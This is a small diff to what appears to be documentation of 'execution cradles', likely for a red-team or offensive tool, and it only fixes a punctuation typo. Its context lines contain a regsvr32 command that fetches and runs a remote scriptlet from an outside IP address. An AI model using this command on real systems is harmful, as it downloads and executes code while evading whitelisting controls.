@@ -65,7 +65,7 @@ regsvr32:
 regsvr32 /s /n /u /i:http://10.10.11.58:80/sctlvjzqylbdzdl scrobj.dll
 ```
 
-As more Execution Cradles are added, the format will be the same.:
+As more Execution Cradles are added, the format will be the same:
 
 ```
 Method:
